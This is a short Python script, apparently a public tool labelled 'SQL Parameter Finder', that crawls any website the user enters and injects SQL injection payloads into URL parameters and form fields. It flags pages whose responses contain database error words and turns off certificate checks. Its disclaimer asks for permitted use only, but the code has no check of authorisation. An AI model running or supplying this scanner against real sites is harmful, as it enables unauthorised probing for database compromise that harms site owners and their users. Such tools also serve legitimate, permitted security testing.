import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────
#             (Demon_Of_Cyber)(Demon_Of_Cyber)
#         SQL Parameter Finder by Arman Mollah
# ─────────────────────────────────────────────

print("""
  ┌────────────────────────────────────────────┐
  │           (Demon_Of_Cyber)                 │
  │      SQL Parameter Finder by Arman Mollah  │
  
  
         DISCLAIMER:
  This tool is intended for ethical security testing only.
  Use it only on websites you own or have explicit permission to test.
  The author and GitHub are not responsible for any misuse or illegal 
  activity.
""")

payloads = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "' AND 1=2 --", "' OR 1=1#", "' OR 'a'='a"
]

common_params = ["id", "page", "file", "cat", "category"]

def find_links(url):
    try:
        res = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        links = [urljoin(url, a.get('href')) for a in soup.find_all('a', href=True)]
        forms = soup.find_all('form')
        return list(set(links)), forms
    except Exception as e:
        print(f"[!] Error crawling {url}: {e}")
        return [], []

def test_sql_injection(url, param_name, param_value, method="GET"):
    for payload in payloads:
        test_value = payload
        test_params = {param_name: test_value}

        try:
            if method == "GET":
                res = requests.get(url, params=test_params, timeout=10, verify=False)
            else:
                res = requests.post(url, data=test_params, timeout=10, verify=False)

            errors = ["sql", "mysql", "syntax", "query", "warning", "PDO", "ODBC"]
            if any(err in res.text.lower() for err in errors):
                print(f"[✔] Vulnerable: {url}")
                print(f"    → Parameter: {param_name}")
                print(f"    → Payload: {payload}")
                return True
        except Exception as e:
            print(f"[!] Error testing {param_name}: {e}")
    return False

def scan_params_in_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return
    print(f"\n[~] Testing parameters in URL: {url}")
    for param in params:
        original = params[param][0]
        print(f"[i] Testing: {param} = {original}")
        test_sql_injection(url.split('?')[0], param, original)

def scan_hidden_params(form, base_url):
    print(f"\n[~] Found form: {form.get('action') or 'No action'}")
    inputs = form.find_all('input')
    for i in inputs:
        name = i.get('name')
        if name:
            value = i.get('value', '')
            full_url = urljoin(base_url, form.get('action', ''))
            print(f"[i] Hidden/Input Field: {name} = {value}")
            test_sql_injection(full_url, name, value, method="POST")

def scan_site(target_url):
    print(f"[~] Scanning: {target_url}")
    links, forms = find_links(target_url)

    # Scan direct URL
    scan_params_in_url(target_url)

    # Scan links
    for link in links:
        scan_params_in_url(link)

    # Scan forms for hidden and visible input parameters
    for form in forms:
        scan_hidden_params(form, target_url)

    print("\n[✔] Scan complete!")

if __name__ == "__main__":
    target = input("Enter website URL to scan for SQLi: ").strip()
    scan_site(target)
